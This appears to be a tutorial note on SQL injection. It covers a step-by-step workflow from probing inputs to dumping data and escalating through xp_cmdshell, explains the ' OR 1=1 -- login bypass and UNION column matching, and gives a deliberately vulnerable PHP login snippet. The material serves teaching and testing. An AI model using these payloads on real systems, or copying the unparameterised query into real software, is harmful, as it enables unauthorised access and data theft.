# SQL Injection

## Workflow

### 1. Identify injectable points

* Look for input fields (GET/POST parameters, headers, cookies) that interact with the backend
* Insert simple test payloads like:
    `'` or `"` → check for syntax errors
    `OR 1=1--` → check for logic bypass
    `AND 1=2` → check for boolean behavior
* Observe error messages, response length, status codes, or timing differences.

### 2. Classify the injection type

* Error-based: Do you get SQL error messages? `(You have an error in your SQL syntax…)`
* Boolean-based blind: Does the page behave differently with true/false conditions?
* Time-based blind: Does `SLEEP(5)` cause a noticeable delay?
* Out-of-band (OOB): DNS or HTTP callbacks triggered?

This classification tells you what exploitation technique you can use.

### 3. Fingerprint database & version

Once you’ve confirmed injection, now you detect DBMS type & version. This is where your point comes in.

* Different DBs behave differently (`' ORDER BY 1--`, `LIMIT`, `OFFSET`, `WAITFOR DELAY`, etc.).

* Example checks:
  * `AND 1=CONVERT(int, 'test')` → MS SQL
  * `' UNION SELECT NULL--` vs `' UNION SELECT NULL,NULL--` → column count
  * `AND version()=version()` → MySQL/Postgres
  * `SELECT @@version` → SQL Server/MySQL

This is critical because exploitation payloads vary heavily by DB type and version.

### 4. Column enumeration & schema extraction

* Find number of columns (`ORDER BY n`)
* Locate injectable columns (`UNION SELECT null, null, 'text'--`)
* Extract schema: `information_schema.tables` (MySQL, Postgres) or `sysobjects` (MSSQL).

### 5. Data extraction

* Dump table names, column names, and then sensitive data.
* Automate with tools like sqlmap after confirmation.

### 6. Privilege escalation (if possible)

* Check if DB user has FILE, EXECUTE, or xp_cmdshell permissions.
* Possible pivot: read/write files, RCE, or privilege escalation on host.

## Why `' OR 1=1 --` Works

Imagine a typical SQL login query that looks like this:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
```

Now suppose an attacker enters `' OR 1=1 --` for username and leaves the password blank or enters anything, The SQL query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';
```

* `--` comments out the rest of the query (everything after it).

* The `OR 1=1` makes the condition which is required for the "`where`" to operate, always true.

* So it becomes:
  * `WHERE username = '' OR 1=1`
  → Which returns all users, because `1=1`is always true.

The backend might log in the first user returned (often admin).

We can test this by using:

```sql
SELECT * FROM Customers where 1=1;
```

### Sample Backend Code

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // VULNERABLE QUERY (SQL Injection possible)
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $conn->query($sql);

    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $message = "Welcome, " . htmlspecialchars($row['username']);
    } else {
        $message = "Login failed.";
    }
}

```

## Why you must determine the number of columns?

When you’re exploiting SQLi with UNION-based injection, the DBMS requires that the SELECT statements on both sides of the UNION have the same number of columns and compatible data types.

That’s why you need to figure out the “number of columns” in the original query before you can inject things like @@version, database(), user(), etc.

If the application query is something like:

```sql
SELECT id, name, email FROM users WHERE id = '1';
```

That query has 3 columns.

If you inject a `UNION SELECT` with a different number of columns, the DBMS throws an error. For example:

```sql
... UNION SELECT 1, @@version --
```

2 columns, mismatch → error

**But if you match exactly:**

```sql
... UNION SELECT 1, @@version, 3 --
```

3 columns, works
